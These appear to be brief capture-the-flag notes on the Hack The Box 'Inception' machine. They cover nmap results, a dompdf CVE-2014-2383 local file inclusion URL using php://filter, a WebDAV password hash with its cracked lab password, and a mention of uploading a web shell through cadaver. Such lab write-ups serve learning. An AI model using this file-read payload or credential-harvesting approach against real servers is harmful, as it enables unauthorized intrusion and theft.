# Inception

Difficulty: 5
Tags: Cadaver, RFI, php://filter, proxy, web shell, webDAV
Type: Linux

# Enumeration

portscan 

```bash
Option Selection: 1
nmap -p80,3128 -sV -sC -T4 -Pn -oA 10.10.10.67 10.10.10.67
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 06:49 EDT
Nmap scan report for inception.htb (10.10.10.67)
Host is up (0.18s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.49 seconds
------------------------------------------------------------
Combined scan completed in 0:04:03.434096
Press enter to quit...
```

- dir scan

```python
/assets               (Status: 301) [Size: 315] [--> http://inception.htb/assets/]
/README.txt           (Status: 200) [Size: 2307]
/LICENSE.txt          (Status: 200) [Size: 17128]
```

- comment at the end of source code of home page indicated the use of `dompdf`
- dompdf 0.6.0 exploit - CVE-2014-2383 - LFI

```
http://<ip>/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH TO FILE>
```

- Looking at apache config file â†’ /etc/apache2/sites-enabled/000-default.conf
    - /var/www/html/webdav_test_inception/webdav.passwd
    - `webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0`
    - `webdav_tester:babygurl69`

# Initial Access

- webdav is installed at /var/www/html/webdav_test_inception
- it must be accesssible from http://10.10.10.67/webdav_test_inception
- using cadaver to get a web shell

# Privilege Escalation

## Notes

-